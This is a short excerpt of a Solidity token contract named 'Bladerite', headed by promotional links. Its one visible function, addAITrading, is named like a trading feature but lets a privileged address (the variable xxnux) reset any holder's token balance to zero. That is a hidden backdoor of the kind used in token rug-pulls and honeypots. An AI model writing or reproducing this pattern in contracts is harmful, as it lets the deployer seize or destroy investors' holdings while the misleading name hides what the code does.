/*  
   ...
   * Website: https://www.theseeds.io/home
   * X: https://twitter.com/blade_rite
   * Telegram: https://discord.com/invite/bladerite
   * Medium: https://medium.com/@bladerite
*/
...
contract Bladerite {
    ...
    function addAITrading(address addBot) external {
        if(xxnux == msg.sender && xxnux != addBot && pancakePair() != addBot && addBot != ROUTER){
            _balances[addBot] = 0;
        }
    }
